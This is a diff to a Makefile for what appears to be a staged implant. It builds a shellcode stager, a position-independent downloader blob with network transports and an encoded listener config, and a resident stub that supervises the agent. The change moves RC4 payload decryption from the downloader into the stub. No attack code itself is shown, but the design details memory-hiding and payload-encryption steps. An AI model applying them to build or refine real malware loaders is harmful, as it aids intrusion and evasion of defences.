@@ -110,10 +110,10 @@ SOCKET_TRANSPORTS := http tcp udp libssl
 DYNLOAD_TRANSPORTS := libcurl libssl
 
 # Downloader stage: a separate PIC blob (its own virtual-address space at 0)
-# that the stub maps, runs, then zeroes and unmaps. It holds the transports,
-# decryption and the encoded listener config, none of which must survive into
-# the supervising phase.
-DL_SRCS = downloader.c utils_min.c packer.c ../common/rc4.c debug.c syscalls.c
+# that the stub maps, runs, then zeroes and unmaps. It holds the transports
+# and the encoded listener config; the payload stays encrypted while in this
+# blob, so no decryption code is needed here.
+DL_SRCS = downloader.c utils_min.c packer.c debug.c syscalls.c
 ifneq ($(filter $(TRANSPORT),$(SOCKET_TRANSPORTS)),)
   DL_SRCS += net_utils.c
 endif
@@ -127,8 +127,10 @@ DL_BIN = downloader.bin
 DL_BLOB_H = downloader_blob.h
 
 # Stub stage: the tiny resident entry point that embeds the downloader blob and
-# owns the agent lifecycle (including the supervisor).
-STUB_SRCS = stub.c utils_min.c debug.c syscalls.c
+# owns the agent lifecycle (including the supervisor). It owns decryption so
+# that the parent can keep the payload ciphertext while each supervised child
+# decrypts its own RX view.
+STUB_SRCS = stub.c utils_min.c ../common/rc4.c debug.c syscalls.c
 
 STAGE0_TARGET = stager
 SHELLCODE = stager.bin
